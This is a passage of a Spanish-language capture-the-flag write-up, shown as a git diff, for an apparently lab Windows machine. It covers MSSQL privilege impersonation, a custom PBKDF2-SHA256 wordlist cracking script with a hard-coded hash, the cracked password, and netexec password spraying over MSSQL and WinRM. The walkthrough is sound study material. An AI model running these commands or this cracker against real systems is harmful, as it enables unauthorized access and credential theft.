@@ -1,7 +1,6 @@
 
 OS: Windows 
 
-
 # Enumeración
 
 ### Nmap
@@ -117,3 +116,183 @@ Intentamos una autenticación hacia mssql  con las credenciales que nos dieron e
 Comprobadas las conexiones a la base de datos, podemos intentar conectarnos usando `impacket-mssqlclient.py`:
 
 ![[Pasted image 20260410210800.png]]
+
+Listemos las bases de datos disponibles, recordemos que la estructura es:
+
+Databases -> esquemas -> tablas -> columnas/filas/etc
+
+Para listar las bases de datos disponibles podemos usar enum_db:
+
+```ruby
+(mssql)> enum_db
+```
+
+Tambien podemos usar:
+
+```ruby
+SELECT name FROM sys.databases
+```
+
+![[Pasted image 20260411171303.png]]
+
+La unica base de datos que no es default es financial_planner, por lo que podemos intantar usarla:
+
+```ruby
+(mssql)> use financial_planner
+```
+
+![[Pasted image 20260411171401.png]]
+
+Como vemos no tenemos permisos para ello, por lo que tenemos que buscar otra via de acceso.
+
+
+Usamos el comando enum_impersonate para ver si tenemos permisos para que kevin (kevin) se pueda hacer pasar por otro usuario:
+
+![[Pasted image 20260411171046.png]]
+
+Efectivamente podemos impersonar al usuario appdev, por lo que podemos usar:
+
+```ruby
+exec_as_login appdev
+```
+
+Ahora somos el usuario appdev, por lo que podemos ver si podemos entrar a la base de datos de `financial_planner`:
+
+![[Pasted image 20260411194512.png]]
+
+Tenemos acceso, ahora debemos intentar ver que tablas  hay dentro de esta base de datos:
+
+```mysql
+SELECT name FROM sys.tables;
+```
+
+![[Pasted image 20260411194829.png]]
+
+Listamos todo el contenido de users:
+
+```mysql
+SELECT * FROM users;
+```
+
+![[Pasted image 20260411194845.png]]
+
+
+Buscamos mas información de este hash poniendo el inicio del mismo en internet y encontramos [esta página](https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256):
+
+
+![[Pasted image 20260411220209.png]]
+
+
+![[Pasted image 20260412072246.png]]
+
+![[Pasted image 20260412072315.png]]
+
+
+Como podemos ver en esta pagina nos entregan la estructura que debe tener, pero aún cambiando la estructura para que hashcat  lo pueda leer, sigue sin poder romper el hash, por lo que opté por crear mi propio hash cracker para esta ocasión: 
+
+
+```python
+#!/usr/bin/env python3
+import hashlib # Librería para algoritmos de hashing (PBKDF2, SHA256, etc.)
+from multiprocessing import Pool, cpu_count # Para usar todos los núcleos del procesador
+
+def check_password(password):
+    """
+    Función que ejecutará cada núcleo (trabajador) de forma independiente.
+    """
+    try:
+        # PBKDF2_HMAC: El algoritmo de derivación de clave.
+        # Es lento por diseño (600,000 iteraciones) para dificultar el cracking.
+        computed = hashlib.pbkdf2_hmac(
+            'sha256',
+            password,          # La palabra del diccionario (en bytes)
+            SALT.encode(),     # el Salt convertido a bytes
+            ITERATIONS         # El número de vueltas de hash
+        )
+
+        # Comparamos el resultado generado con nuestro objetivo (TARGET_HASH)
+        if computed.hex() == TARGET_HASH:
+            # Si coincide, decodifica los bytes a texto y los devuelve
+            return password.decode(errors="ignore")
+    except:
+        # Si hay un error con una palabra específica, la ignora y sigue con la siguiente
+        pass
+
+    return None # Si no coincide, devuelve nada
+
+# ---- Componentes del Hash (Configuración) ----
+SALT = "AMtzteQIG7yAbZIa"
+ITERATIONS = 600000
+TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
+
+# ---- Ruta de tu diccionario ----
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+def main():
+    print(f"[+] Using wordlist: {WORDLIST}")
+    print("[+] Starting PBKDF2-SHA256 cracking...")
+
+    # El primer 'with': Asegura que el archivo se cierre solo, incluso si el script falla.
+    # Se abre en modo "rb" (read binary) para que el generador trabaje con bytes directamente.
+    with open(WORDLIST, "rb") as f:
+        
+        # Generador: Lee el archivo línea por línea sin cargarlo todo en la RAM.
+        # line.strip() quita los saltos de línea (\n) de cada palabra.
+        passwords = (line.strip() for line in f)
+
+        # El segundo 'with': Crea el Pool (piscina) de procesos.
+        # cpu_count() detecta cuántos hilos/núcleos tiene tu PC para usarlos todos.
+        with Pool(cpu_count()) as pool:
+            
+            # imap_unordered: Reparte las palabras entre los núcleos.
+            # chunksize=500: Envía paquetes de 500 palabras a cada núcleo para ser más eficiente.
+            for result in pool.imap_unordered(check_password, passwords, chunksize=500):
+                
+                # Si algún núcleo encuentra la contraseña (deja de ser None):
+                if result:
+                    print(f"[+] PASSWORD FOUND: {result}")
+                    # Cerramos los demás procesos inmediatamente para ahorrar recursos
+                    pool.terminate()
+                    return
+
+    # Si el generador se agota y nadie devolvió un resultado
+    print("[-] No match found.")
+
+# Punto de entrada para evitar que el código se ejecute infinitamente al crear procesos hijos
+if __name__ == "__main__":
+    main()
+```
+
+Explicacion de este script de python en mi repositorio "Mi_Camino".
+
+Logramos crackear el hash gracias al script, la contraseña es `iloveyou1`, solo tneemos que averiguar para que usuario, para ello podemos hacer un password spring pero para ello necesitamos una lista de usuarios, esto lo haremos con un RID brute forcing, podemos usar netexec para esta tarea:
+
+```shell
+sudo netexec mssql 10.129.27.119
+```
+
+![[Pasted image 20260412121628.png]]
+
+
+Podemos intuir que los usuarios son los que están al final:
+
+![[Pasted image 20260412121842.png]]
+
+Por lo que nos lo metemos en una lista users.txt y lo usamos para hacer un password sprying con la contraseña `iloveyou1` sobre todos estos usuarios, para lo que tambien podemos usar netexec:
+
+
+```shell
+sudo netexec mssql -u users.txt -p 'iloveyou1'
+```
+
+
+![[Pasted image 20260412122811.png]]
+
+Vemos que usando mssql para enumerar lo nos da errores, por lo que podemos usar winrm (el otro servicio abierto), para hacer el password sprying:
+
+![[Pasted image 20260412122907.png]]
+
+Vemos que el usuario adam.scott tiene la contraseña `iloveyou1`, ya con las credenciales encontradas podemos conectarnos a traves de winrm y conseguir la primera flag user.txt:
+
+![[Pasted image 20260416195247.png]]
+
